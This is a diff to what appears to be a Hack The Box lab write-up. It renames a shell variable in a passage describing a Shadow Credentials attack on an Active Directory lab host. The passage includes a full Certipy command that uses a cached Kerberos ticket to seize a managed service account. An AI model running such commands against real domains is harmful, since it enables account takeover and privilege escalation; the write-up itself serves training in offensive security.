@@ -350,7 +350,7 @@ By writing a custom certificate to the `msDS-KeyCredentialLink` attribute of `MS
 
 With a valid TGT cached, we utilize `Certipy` to orchestrate the Shadow Credentials attack.
 
-We use the `env KRB5CCNAME=svc_recovery.ccache` inline variable to force `Certipy` to authenticate via our cached Kerberos ticket (`-k -no-pass`). Critically, we explicitly specify both `-dc-host dc01.logging.htb` and `-dc-ip $targetIp` to ensure proper hostname validation during the PKINIT handshake.
+We use the `env KRB5CCNAME=svc_recovery.ccache` inline variable to force `Certipy` to authenticate via our cached Kerberos ticket (`-k -no-pass`). Critically, we explicitly specify both `-dc-host dc01.logging.htb` and `-dc-ip $target_ip` to ensure proper hostname validation during the PKINIT handshake.
 
 ```Bash
 # Execute Shadow Credentials attack with proper DNS validation
@@ -359,7 +359,7 @@ fake_time dc01.logging.htb \
 certipy shadow auto \
     -u svc_recovery -k -no-pass \
     -account 'msa_health$' \
-    -target dc01.logging.htb -dc-host dc01.logging.htb -dc-ip $targetIp
+    -target dc01.logging.htb -dc-host dc01.logging.htb -dc-ip $target_ip
 
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
